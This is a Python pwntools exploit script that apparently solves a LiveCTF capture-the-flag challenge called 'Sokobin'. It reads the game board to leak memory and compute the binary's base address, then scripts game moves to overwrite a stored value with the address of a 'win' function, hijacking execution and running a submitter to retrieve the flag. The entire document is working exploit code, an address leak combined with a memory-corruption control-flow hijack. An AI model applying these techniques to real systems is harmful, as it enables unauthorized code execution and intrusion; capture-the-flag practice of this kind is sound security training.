#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64")
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


while True:
    p = remote(HOST, PORT)
    # p = elf.process()
    # if args.GDB:
    # 	gdb.attach(p)
    # 	pause()

    p.recvuntil(b"Sokobin!\n")

    def get_table():
        table = []
        for i in range(32):
            row = p.recvline()
            table.append(row)
        return table

    def move(dir):
        p.sendline(dir.encode())
        p.recvuntil(b"Sokobin!\n")
        return get_table()

    def print_table(t):
        pass

    t = get_table()
    print_table(t)

    leaks = []
    for i in range(0x10):
        h = t[2*i]
        hv  = sum([(1 if v==ord('o') else 0) << idx for idx, v in enumerate(h)])
        l = t[2*i+1]
        lv  = sum([(1 if v==ord('o') else 0) << idx for idx, v in enumerate(l)])
        v = hv << 32 | lv
        #print(hex(v))
        leaks.append(v)

    elf_base = leaks[6] - 0x1274
    info("elf base = " + hex(elf_base))
    win = elf_base + 0x1250

    def moveall(s):
        for c in s:
            t = move(c)
        return t

    def moveprint(s):
        t = moveall(s)
        print_table(t)
        return t

    def get_player(t):
        for row in range(len(t)):
            for col in range(len(t[row])):
                if t[row][col] == ord("@"):
                    return (row, col)
        return None

    def t2nums(t):
        nums = []
        for i in range(0x10):
            h = t[2*i]
            hv  = sum([(1 if v==ord('o') else 0) << idx for idx, v in enumerate(h)])
            l = t[2*i+1]
            lv  = sum([(1 if v==ord('o') else 0) << idx for idx, v in enumerate(l)])
            v = hv << 32 | lv
            nums.append(v)
        return nums


    try:
        moveprint("w" + "s" * 14 + "r" + "s" * 17 + "wwwwwww")
        moveprint("a" * 31 + "www" + "s" * 31 + "wra" * 31 + "s" * 31 + "r" + "wrs" * 31)
        moveprint("w" + "a" * 31 + "rrr")
        moveprint("wwww" + "wrs" * 31)
        moveprint("a" * 31 + "rrr")
        moveprint("ww" + "wwrrs" * 31 + "awwsw" + "a" * 31)
        t = moveprint("r" + "a" * 31 + "rrrr" + "r" + "s" * 31 + "wwwwwrrrrr" + "a" * 31 + "w")
    except EOFError:
        continue

    low = win & (2**32 - 1)
    high = (win >> 32) & (2**32 - 1)

    start_over = None
    for i in range(32):
        if low & (1 << i):
            r, c = get_player(t)
            if t[r - 1][c] == ord("o"):
                t = moveall("wrs")
            else:
                start_over = i
        else:
            t = moveall("s")

    print_table(t)
    # for n in t2nums(t):
    # 	print(hex(n))
    print("win: " + hex(win))

    t = moveprint("r" + "wrs" * 31 + "w" + "a" * 32)

    for i in range(32):
        if low & (1 << i):
            r, c = get_player(t)
            if t[r - 2][c] != ord("o"):
                t = moveall("wr")
        t = moveall("s")
    print_table(t)
    # for n in t2nums(t):
    # 	print(hex(n))
    print("win: " + hex(win))

    moveprint("a" * 31 + "wwww" + "s" * 31 + "ww" + "a" * 31)

    for i in range(32):
        if high & (1 << i):
            t = moveall("rrww")
        t = moveall("s")

    print_table(t)
    #for n in t2nums(t):
        #print(hex(n))
    print("win: " + hex(win))

    nums = t2nums(t)
    if nums[10] == win:
        print("SUCCESS!")
        p.sendline(b"q")
        sleep(1)
        p.sendline(b"./submitter")
        flag = p.recvline_contains(b'LiveCTF{').decode().strip()
        log.info('Flag: %s', flag)
        break
    else:
        print("FAIL")
        p.close()
